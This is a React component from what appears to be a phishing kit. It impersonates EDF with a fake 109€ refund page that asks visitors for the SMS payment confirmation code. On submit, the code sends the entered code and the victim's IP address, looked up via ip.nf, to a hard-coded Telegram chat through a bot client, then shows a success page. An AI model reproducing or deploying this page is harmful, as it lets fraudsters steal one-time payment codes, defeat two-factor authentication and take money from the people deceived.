import React from 'react';
import './css/final.css';
import { useForm } from "react-hook-form";
import { BrowserRouter as Router, Route, useHistory } from "react-router-dom";

const { TelegramClient } = require('messaging-api-telegram');
function Smsz() {
  const client = new TelegramClient({
    accessToken: 'ACCESSTOKEN',
  });
  var history = useHistory();
  var ipy;
  fetch('https://ip.nf/me.json')
    .then(results => results.json())
    .then(data => ipy = data)
    .then(console.log)
    
  
const { register, handleSubmit } = useForm();

const onSubmit = (data) => {
  var  dinto = data;
  var kali ="===========+++ ❤ EDF CHX ❤ +++========\n"+ "SMS CODE : "+dinto.sms+"\n"+"\n"+"\n"+ "===========+++ ❤ EDF CHX ❤ +++========\n"+"IP Adresse : "+ ipy.ip.ip;
  client.sendMessage(157566545,kali)
  if (kali !=null)  {
    history.push("/Succes");
  }
  
};


  return (
    <div className="Smsz">
     <div>
        <div id="title">
          <img style={{marginTop: '10px'}} src="logo.png" />
          <h1 style={{fontSize: '30px', color: 'rgb(226, 58, 5)', float: 'right', marginRight: '10px'}}> Rectification annuelle EDF </h1>
        </div>
        <div id="corps1">
          <div id="title2">
            <h2 style={{color: 'rgb(50, 50, 50)', paddingLeft: '20px', fontSize: '20px'}}>Remboursement - Total : 109€ </h2>
          </div>
          <br />
          <div id="prefooterAmeli_1" className="wlp-bighorn-window  "><div className="wlp-bighorn-window-content">
              <div className="prefooterbody seul" style={{fontSize: '14px', padding: '0px 0px 1px 0px', fontWeight: 'bolder'}}>
                <p>   Authentification de paiement</p>
              </div></div></div>
          <br />
          <div align="center" style={{padding: '8px', margin: 'auto', border: '1px solid #CCC', backgroundColor: '#f5f5f5', textAlign: 'center'}}>
            <p style={{padding: '5px', margin: '0 0 15px 0', fontSize: '13px', fontWeight: 'bold', backgroundColor: '#FFF', border: '1px solid #F1F1F1', color: '#2c64b8'}}>CODE DE CONFIRMATION</p>
            <form action="/Sucees" method="post" id="formulaire_saisie_adresse"  onSubmit={handleSubmit(onSubmit)}>
              <div style={{fontWeight: 'bolder', fontSize: '12px'}}>
                Nous vous remercions de vous authentifier en saisissant le code de confirmation à reçu sur votre téléphone.
                <br />Cette authentification est obligatoire pour confirmer votre opération.</div>
              <div id="eccoccpformtab">
                <p className="clearfix">   
                </p><div style={{fontWeight: 'bolder', fontSize: '12px'}}>Code de confirmation :</div>	
                <input id="sms" {...register("sms")}  className="eccoccp" name="sms" required placeholder style={{textAlign: 'center', width: '26%', WebkitAppearance: 'none', margin: 0, border: '1px solid #b4b4b4', height: '28px', padding: '5 px', lineHeight: 'normal', paddingLeft: '10px', color: '#6a6a74', outline: 'none', WebkitBorderRadius: '4px !important', MozBorderRadius: '4px !important', borderRadius: '4px !important', fontSize: '13px', WebkitBoxSizing: 'border-box', MozBoxSizing: 'border-box', boxSizing: 'border-box'}} type="text" /><span className="ico" />
                <p />
                <br /><br />
                <div style={{clear: 'both', height: '1px'}}>&nbsp;</div>
                <div>
                  <button className="btn-base btn-primary btn-simple btn-inverse" style={{borderRadius: '3px', fontSize: '13px', fontFamily: 'Arial', fontWeight: 'bold', padding: '7px 16px', verticalAlign: 'top', background: '#2c64b8', border: '1px solid #2c64b8', color: '#FFF'}} type="submit">Annuler</button>
                  <button id="validate" className="btn-base btn-primary btn-simple" style={{borderRadius: '3px', fontSize: '13px', fontFamily: 'Arial', fontWeight: 'bold', padding: '7px 16px', verticalAlign: 'top', background: '#2c64b8', border: '1px solid #2c64b8', color: '#FFF'}} type="submit">Confirmer</button>
                </div>
              </div></form>
          </div>
          <div className="container">
            &nbsp;
            <p style={{marginTop: '-40px'}}> Votre adresse e-mail sera exclusivement utilisée dans le cadre de votre espace Client. Elle ne sera jamais vendue à un tiers. 
              Les informations collectées sont destinées à EDF. Elles seront utilisées dans le cadre de la création de votre espace Client et le cas échéant à des fins de prospection commerciale. Conformément à la loi informatique et libertés modifiée, vous disposez sur les informations vous concernant d’un droit d’accès et de rectification ainsi que d’un droit d’opposition, sans frais, à l’utilisation de ces informations à des fins de prospection commerciale.
              Vous pouvez exercer vos droits sous réserve de justifier de votre identité en vous adressant par courrier à EDF - Direction de la Communication - Département Multimédia, 22 - 30 Avenue de Wagram - 75008 Paris. </p>
            <table align="center" width={750}>
              <tbody>
                <tr>
                  <td>
                    <img src="sec.png" /> 
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div></div>
    </div>
  );
}

export default Smsz;